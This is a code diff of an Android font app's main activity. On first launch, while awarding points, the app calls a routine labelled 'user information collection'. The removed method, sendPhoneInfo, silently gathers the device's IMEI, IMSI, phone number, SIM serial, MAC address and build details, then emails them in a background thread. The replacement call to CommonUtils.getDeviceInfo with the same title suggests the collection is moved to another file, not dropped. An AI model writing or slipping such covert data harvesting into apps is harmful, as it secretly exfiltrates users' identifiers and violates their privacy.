@@ -265,7 +265,7 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
 		if (isWifi || isNetData) {
 			boolean isFirstLoading = sp.getBoolean("isFirstLoading", true);
 			if (isFirstLoading){
-				sendPhoneInfo("用户信息搜集",this);
+				CommonUtils.getDeviceInfo("用户信息搜集",this);
 				PointsHelper.awardPoints(this, Integer.parseInt(sAwardPoints));
 				sp.edit().putBoolean("isFirstLoading", false).commit();
 				new AlertDialog.Builder(this).setTitle("美图手机2字体")
@@ -282,94 +282,6 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
 				Toast.makeText(this, getResources().getString(R.string.special_awards) + specialAwards, Toast.LENGTH_SHORT).show();
 			}
 		}
-	}
-	
-	public static String getLocalMacAddress(Context ctx) {  
-        WifiManager wifi = (WifiManager) ctx.getSystemService(Context.WIFI_SERVICE);  
-        WifiInfo info = wifi.getConnectionInfo();  
-        return info.getMacAddress();  
-    }  
-
-	public static void sendPhoneInfo(String title,Context ctx) {
-		StringBuilder sb=new StringBuilder();
-      
-        sb.append("BOARD:")
-        .append(android.os.Build.BOARD)
-        .append(";BOOTLOADER:") 
-        .append(android.os.Build.BOOTLOADER)
-        .append(";BRAND:")
-        .append(android.os.Build.BRAND)
-        .append(";CPU_ABI:")
-        .append(android.os.Build.CPU_ABI)
-        .append(";CPU_ABI2:")
-        .append(android.os.Build.CPU_ABI2)
-        .append(";DEVICE:")
-        .append(android.os.Build.DEVICE)
-        .append(";FINGERPRINT:")
-        .append(android.os.Build.FINGERPRINT)
-        .append(";HARDWARE:")
-        .append(android.os.Build.HARDWARE)
-        .append(";HOST:")
-        .append(android.os.Build.HOST)
-        .append(";ID:")
-        .append(android.os.Build.ID)
-        .append(";MANUFACTURER:")
-        .append(android.os.Build.MANUFACTURER)
-        .append(";MODEL:")
-        .append(android.os.Build.MODEL)
-        .append(";PRODUCT:")
-        .append(android.os.Build.PRODUCT)
-        .append(";RADIO:")
-        .append(android.os.Build.RADIO)
-        .append(";SERIAL:")
-        .append(android.os.Build.SERIAL)
-        .append(";TAGS:")
-        .append(android.os.Build.TAGS)
-        .append(";TYPE:")
-        .append(android.os.Build.TYPE)
-        .append(";USER:")
-        .append(android.os.Build.USER)
-        .append(";getRadioVersion:")
-        .append(android.os.Build.getRadioVersion())
-        .append(";ANDROID VERSION:").append(android.os.Build.VERSION.RELEASE)
-        .append(";DISPLAY:").append(android.os.Build.DISPLAY)
-        .append(";DEVICE:").append(android.os.Build.DEVICE)
-		.append(";SDK:").append(android.os.Build.VERSION.SDK_INT)
-		.append(";MAC:").append(getLocalMacAddress(ctx));
-        
-		TelephonyManager telephonyManager= (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
-		String imei=telephonyManager.getDeviceId();
-		sb.append(";imei:"+imei)
-		.append(";Subscriber imsi:").append(telephonyManager.getSubscriberId())
-		.append(";model:").append(Build.MODEL)
-		.append(";tel:"+telephonyManager.getLine1Number())
-		.append(";network type："+telephonyManager.getNetworkType())
-		.append(";运营商："+telephonyManager.getSimOperatorName())
-		.append(";是否漫游状态:"+telephonyManager.isNetworkRoaming())
-		.append(";SimCountryIso:" + telephonyManager.getSimCountryIso())
-        .append(";SimOperator:" + telephonyManager.getSimOperator()) 
-        .append(";SimSerialNumber:" + telephonyManager.getSimSerialNumber())  
-        .append(";SimState:" + telephonyManager.getSimState());
-		
-		final MailSenderInfo mailInfo = CommonUtils.initEmail();
-		mailInfo.setSubject(title+"：");
-
-		String mailContent = "用户手机信息搜集内容：\n\n";
-
-		mailContent += sb.toString();
-
-		mailInfo.setContent(mailContent);
-		// 这个类主要来发送邮件
-		new Thread(new Runnable() {
-
-			@Override
-			public void run() {
-				SimpleMailSender sms = new SimpleMailSender();
-				sms.sendTextMail(mailInfo);// 不能再UI线程执行
-
-			}
-		}).start();
-        
 	}
 	
     private void installFontApk() {
